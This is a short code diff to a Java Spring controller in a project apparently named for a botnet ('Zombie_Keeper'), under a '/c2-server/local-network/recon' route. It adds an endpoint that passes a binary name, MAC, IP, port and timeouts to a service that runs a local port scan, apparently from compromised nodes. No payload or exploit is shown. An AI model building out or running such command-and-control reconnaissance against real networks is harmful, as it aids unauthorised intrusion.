@@ -19,6 +19,8 @@ import com.manager.Zombie_Keeper.service.localNetwork.aux.LocalNetworkDatabaseMa
 import com.manager.Zombie_Keeper.service.localNetwork.fingerprint.LocalNetworkFingerprintService;
 
 import tools.jackson.databind.ObjectMapper;
+import org.springframework.web.bind.annotation.RequestParam;
+
 
 @RestController
 @RequestMapping("/c2-server/local-network/recon")
@@ -69,6 +71,33 @@ public class ReconController {
 
         return ResponseEntity.ok(json);
     }  
+
+    @GetMapping(value = "/node/{binaryName}/{networkIdentfier}/{mac}/{ip}/{port}/{sec}/{usec}")
+
+    public ResponseEntity<Integer> simpleScan(@PathVariable String binaryName, @PathVariable String networkIdentfier, 
+        @PathVariable String mac,  @PathVariable String ip,@PathVariable String port, @PathVariable String sec, @PathVariable String usec) {
+
+
+        try {
+            int result = localNetFp.excLocalPortScan(binaryName, networkIdentfier, mac, ip, port, sec, usec);
+
+
+
+            return ResponseEntity.ok(result);
+
+
+        } catch (Exception e) {
+           
+            e.printStackTrace();
+            System.out.println("ERROR " + e.getMessage());
+        }   
+
+        
+
+        return ResponseEntity.ok(-1);
+
+    }
+    
 
     @GetMapping(value = "/node/{binaryName}/{mac}/{networkIdentfier}/{flag}/{sec}/{usec}", produces = MediaType.APPLICATION_JSON_VALUE)
     public ResponseEntity<String> nodeRecon(@PathVariable String binaryName, @PathVariable String networkIdentfier, 
